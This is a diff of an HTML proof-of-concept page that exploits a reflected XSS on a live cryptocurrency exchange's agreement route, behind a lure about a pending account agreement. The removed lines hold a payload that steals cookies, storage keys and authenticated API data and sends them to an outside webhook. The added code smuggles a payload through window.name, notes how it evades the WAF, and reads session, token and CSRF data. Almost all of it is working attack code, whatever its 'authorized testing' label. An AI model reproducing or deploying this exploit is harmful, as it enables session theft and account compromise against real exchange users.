@@ -6,12 +6,15 @@
 <title>KuCoin Auto-Conversion Agreement</title>
 <style>
  body{font:16px/1.6 -apple-system,system-ui,sans-serif;margin:0;background:#0b0e11;color:#eaecef}
- .wrap{max-width:620px;margin:0 auto;padding:60px 24px;text-align:center}
+ .wrap{max-width:660px;margin:0 auto;padding:48px 24px}
  h1{font-size:26px;margin:0 0 14px}
- p{color:#b7bdc6;margin:0 0 28px}
- a.cta{display:inline-block;background:#01bc8d;color:#06111c;font-weight:700;
-   font-size:17px;padding:15px 34px;border-radius:8px;text-decoration:none}
- small{display:block;margin-top:40px;color:#5e6673;font-size:12px}
+ p{color:#b7bdc6;margin:0 0 20px}
+ button.cta{display:block;width:100%;background:#01bc8d;color:#06111c;font-weight:700;
+   font-size:17px;padding:15px 34px;border:0;border-radius:8px;cursor:pointer;margin:0 0 12px}
+ button.alt{background:#2b3139;color:#eaecef}
+ ol{color:#b7bdc6;font-size:14px;padding-left:20px}
+ code{background:#161a1e;padding:2px 5px;border-radius:4px;font-size:13px}
+ small{display:block;margin-top:32px;color:#5e6673;font-size:12px}
 </style>
 </head>
 <body>
@@ -19,8 +22,111 @@
   <h1>Review your Auto-Conversion Agreement</h1>
   <p>Your account has a pending auto-conversion agreement awaiting review.
      Open it to confirm the terms.</p>
-  <a class="cta" href="https://www.kucoin.com/express/agreements/auto-conversion?displayParams=%7B%22currency%22%3A%22%3Ca%20href%3Djavascript%3Aname%3E%3Cspan%20class%3D%5C%22fixed%20inset-0%20z-50%20block%5C%22%3ECLICK%3C%2Fspan%3E%3C%2Fa%3E%22%7D" target="&lt;img src=x onerror=&quot;(async()=&gt;{const g=async u=&gt;{try{const r=await fetch(u,{credentials:&#x27;include&#x27;});return{u:u,s:r.status,b:(await r.text()).slice(0,2500)}}catch(e){return{u:u,e:String(e)}}};const out={m:&#x27;M125-XSS&#x27;,o:location.origin,h:location.href.slice(0,120),ck:document.cookie,lsk:Object.keys(localStorage),ssk:Object.keys(sessionStorage),api:[await g(&#x27;/_api/ucenter/user-info&#x27;)]};const s=JSON.stringify(out),N=1000,n=Math.ceil(s.length/N);for(let i=0;i&lt;n;i++){new Image().src=&#x27;https://webhook.site/7c5457a8-8c6f-474d-ba71-10560e051959?i=&#x27;+i+&#x27;&amp;n=&#x27;+n+&#x27;&amp;d=&#x27;+encodeURIComponent(s.slice(i*N,(i+1)*N));}document.title=&#x27;M125-EXFIL-SENT-&#x27;+n;document.body.innerHTML=&#x27;&lt;h1 style=font-size:30px&gt;XSS executed on &#x27;+location.origin+&#x27;&lt;br&gt;&#x27;+n+&#x27; chunks sent&lt;/h1&gt;&#x27;;})()&quot;&gt;">Review agreement</a>
+
+  <button class="cta" id="go">Review agreement</button>
+  <button class="cta alt" id="goTab">Review agreement (open in a new tab)</button>
+
+  <ol>
+    <li>Click a button above. This page stores the payload in <code>window.name</code> and
+        sends the browser to the KuCoin agreement route.</li>
+    <li>On the KuCoin page, click anywhere. The injected anchor is a full-viewport overlay
+        whose href is <code>javascript:name</code>.</li>
+    <li>The payload executes on <code>https://www.kucoin.com</code> and renders what it can
+        reach from inside that origin.</li>
+  </ol>
+
   <small>PoC - authorized security testing</small>
 </div>
+
+<script>
+// ---------------------------------------------------------------------------
+// The vulnerable sink. displayParams is reflected into the page as raw HTML,
+// so the anchor below becomes a real element. It carries no JavaScript syntax
+// in the URL, which is what keeps it past the WAF; the code travels separately
+// in window.name.
+// ---------------------------------------------------------------------------
+var SINK = "https://www.kucoin.com/express/agreements/auto-conversion"
+  + "?displayParams=" + encodeURIComponent(
+      '{"currency":"<a href=javascript:name><span class=\\"fixed inset-0 z-50 block\\">CLICK</span></a>"}'
+    );
+
+// ---------------------------------------------------------------------------
+// The payload. Written as a normal function so it can use any quoting it
+// likes; it is serialised and HTML-escaped below before it goes into the
+// window name, so the browser hands it back intact inside the onerror
+// attribute. Read-only: it proves the origin it runs in and what that origin
+// authorises. It sends nothing to any third party.
+// ---------------------------------------------------------------------------
+function payload() {
+  var esc = function (s) {
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  };
+  var rows = [];
+  var add = function (k, v) { rows.push('<tr><th align=left>' + esc(k) + '</th><td>' + esc(v) + '</td></tr>'); };
+
+  var render = function () {
+    document.documentElement.innerHTML =
+      '<body style="font:15px/1.5 ui-monospace,monospace;background:#0b0e11;color:#eaecef;padding:28px">'
+      + '<h1 style="color:#01bc8d;font-size:28px;margin:0 0 4px">XSS executing on ' + esc(location.origin) + '</h1>'
+      + '<p style="color:#b7bdc6;margin:0 0 20px">location.href is unchanged: ' + esc(location.href.slice(0, 160)) + '</p>'
+      + '<table cellpadding=6 style="border-collapse:collapse;background:#161a1e">' + rows.join('') + '</table>'
+      + '</body>';
+    // set after the replacement: innerHTML on documentElement drops the old head
+    document.title = 'M125-XSS-EXECUTED';
+  };
+
+  add('location.origin', location.origin);
+  add('document.cookie length', document.cookie.length + ' chars, '
+    + (document.cookie ? document.cookie.split(';').length : 0) + ' cookies readable from script');
+
+  var ls = [];
+  try { ls = Object.keys(localStorage); } catch (e) { ls = ['<unreadable: ' + e + '>']; }
+  add('localStorage keys', ls.length);
+  add('auth-looking keys', ls.filter(function (k) {
+    return /auth|login|token|csrf|session|uid/i.test(k);
+  }).join(', ') || '(none)');
+
+  // Same-origin authenticated read. The session cookie rides along
+  // automatically, so HttpOnly is irrelevant from inside this origin.
+  fetch('/_api/ucenter/user-info', { credentials: 'include' })
+    .then(function (r) { add('GET /_api/ucenter/user-info', 'HTTP ' + r.status); return r.text(); })
+    .then(function (t) {
+      var csrf = (t.match(/"csrf"\s*:\s*"([^"]+)"/) || [])[1];
+      add('csrf in response body', csrf ? 'present, ' + csrf.length + ' chars, starts ' + csrf.slice(0, 6) + '...' : 'not present');
+      add('response body length', t.length + ' chars');
+      render();
+    })
+    .catch(function (e) { add('GET /_api/ucenter/user-info', 'failed: ' + e); render(); });
+
+  render();
+}
+
+// ---------------------------------------------------------------------------
+// Build the window name. The payload goes inside an onerror attribute, so
+// & and " are HTML-escaped (& first) and the parser decodes them back.
+// ---------------------------------------------------------------------------
+var CODE = '(' + payload.toString() + ')()';
+var NAME = '<img src=x onerror="'
+  + CODE.replace(/&/g, '&amp;').replace(/"/g, '&quot;')
+  + '">';
+
+// ---------------------------------------------------------------------------
+// Delivery. Two rules, both measured:
+//  - window.name must be set AFTER this document has loaded. Setting it and
+//    navigating in the same pre-load tick loses the name (it arrives empty).
+//  - both of these run from a real click, so there is user activation and the
+//    popup blocker does not interfere.
+// ---------------------------------------------------------------------------
+function sameTab() {          // no popup involved, so no popup blocker
+  window.name = NAME;
+  location.href = SINK;
+}
+function newTab() {           // the window.open form
+  window.open(SINK, NAME);
+}
+
+document.getElementById('go').addEventListener('click', sameTab);
+document.getElementById('goTab').addEventListener('click', newTab);
+</script>
 </body>
 </html>
